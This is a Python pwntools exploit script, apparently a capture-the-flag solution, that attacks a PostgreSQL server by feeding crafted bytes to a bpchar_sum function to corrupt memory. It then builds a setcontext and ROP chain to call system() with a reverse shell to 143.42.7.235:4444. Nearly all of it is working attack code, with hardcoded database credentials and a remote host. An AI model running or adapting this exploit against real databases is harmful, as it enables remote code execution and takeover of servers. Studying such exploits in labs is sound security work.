import psycopg2
from pwn import *

# author: Rivit

conn = None

def local():
    global conn
    conn = psycopg2.connect(host="localhost",user="ctf",password="123qwe!@#QWE",dbname="postgres")


def remote():
    global conn
    conn = psycopg2.connect(host="47.88.60.165",user="ctf",password="123qwe!@#QWE",dbname="postgres", port=39295)


libc_base = 0x7f87a750a1ca-0x271ca    # local
# libc_base = 0x7f2d8407b1ca-0x271ca  # remote

rdi = libc_base-0xdf24fb0 # offset to controlled memory chunk
payload = b"\x01\x02"+p64(rdi) # trigger get_flat_size


SETCONTEXT = 0x40ef0
SYSTEM = 0x4c3a0
POP_RDI = 0x0000000000027765 # : pop rdi ; ret

def leak():
    conn.commit(); cur = conn.cursor()
    cur.execute(b"select bpchar_sum('1', '" + payload.strip(b'\x00') + b"')")


def exploit():
    conn.commit(); cur = conn.cursor()
    cur.execute(b"SELECT repeat('1s0', 1000)") # fix rdi MSB

    fake_struct = flat(
        b'whatever',
        p64(rdi+0x10), # point to address below
        p64(libc_base+SETCONTEXT),
        b'/bin/bash -c "/bin/sh -i >& /dev/tcp/143.42.7.235/4444 0>&1"   \x00', # padded to 8B
    )

    for v in range(1+8, 0x1d):
        if v == 0x13: # rcx
            # special case - point it to ret
            # it is being pushed on stack later, so we dont want to break our ROP
            fake_struct += p64(libc_base+POP_RDI+1)
            continue
        
        # create values that will be picked by [rdx+X] operations
        # 0x10000 is to move our new rsp a bit further so `system` function stack is able to grow
        fake_struct += p64(rdi+0x70+0x88+0x10000)

    # add padding
    for _ in range(0x10000//8):
        fake_struct += p64(0xDD)

    # ROP
    fake_struct += flat(
        p64(libc_base+POP_RDI+1), # ret to align the stack
        p64(libc_base+POP_RDI),
        p64(rdi+0x18), # reverse shell cmd
        p64(libc_base+SYSTEM),
    )

    cur.execute(flat(
        b"SELECT '\\x",
        b'deadbeef', # add 4B padding to align the rest of payload to 8B
        fake_struct.hex().encode(),
        b'aaaaaaaa' * 0x400000,
        b"'::bytea, bpchar_sum('1', '",
        payload.strip(b'\x00'), # no null bytes allowed
        b"')"
    ))


# local() / remote()
# leak()
# exploit()
